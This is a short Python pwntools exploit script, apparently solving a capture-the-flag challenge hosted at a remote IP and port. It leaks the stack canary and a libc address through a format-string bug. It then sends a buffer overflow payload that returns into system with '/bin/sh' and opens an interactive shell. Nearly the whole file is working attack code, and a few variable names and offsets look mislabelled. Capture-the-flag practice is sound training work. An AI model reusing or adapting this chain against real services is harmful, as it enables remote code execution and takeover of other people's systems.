#!/usr/bin/python


from pwn import *

# target: flag @ 167.172.144.44:9999

def main():

    #PLT & GLT
    read_plt = 0x080490d0
    read_got = 0x0804c00c
    write_plt = 0x08049140
    write_got = 0x804c028
    puts_plt = 0x08049100
    puts_got = 0x0804c018
    snprintf_plt = 0x08049150
    snprintf_got = 0x0804c02c

    #ROP Gadgets
    popEbp_ret = 0x080493f3
    pop_ret = 0x08049022
    pop_pop_pop_ret = 0x080493f1


    #libc offsets
    offset_libc_start_main_ret = 0x1f8f9
    offset_puts = 0x8049100
    offset_system = 0x00049750
    offset_dup2 = 0x0010b670
    offset_read = 0x0010a8b0
    offset_write = 0x0010a9a0
    offset_str_bin_sh = 0x1b8fef

    snprintf = 0x0804c02c

    ed_string = 0x804831f


    #find and store canary value
    p = remote("167.172.144.44",9999)
    p.sendline("%29$x")
    canary = p.recv()
    log.info("canary value 0x%s" % canary)
    canary_value = int(canary, 16)
    payload = p32(write_got)+b"%4$s\n"
    p.sendline(payload)
    p.recv(4)
    sn = p.recv(4)
    snprintf = u32(sn)
    libc_starter_address = snprintf - offset_write
    system_libc = libc_starter_address + offset_system
    libc_str = libc_starter_address + offset_str_bin_sh
    payload = b"A" * 100
    payload += p32(canary_value)
    payload += b"A" * 12
    payload += p32(system_libc)
    payload += p32(0xdeadbeef)
    payload += p32(libc_str)
    p.sendline(payload)

    # Change to interactive mode
    p.interactive()


if __name__ == "__main__":
    main()
